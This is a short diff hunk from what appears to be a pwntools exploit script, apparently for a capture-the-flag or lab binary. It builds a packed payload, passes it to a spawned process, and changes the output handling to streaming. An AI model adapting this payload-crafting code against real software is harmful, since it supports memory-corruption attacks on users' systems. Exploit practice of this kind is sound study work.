@@ -16,4 +16,4 @@ payload += p32(gen_templates["X"])
 
 p = e.process([payload])
 
-print(p.recvlineS())
+p.stream()
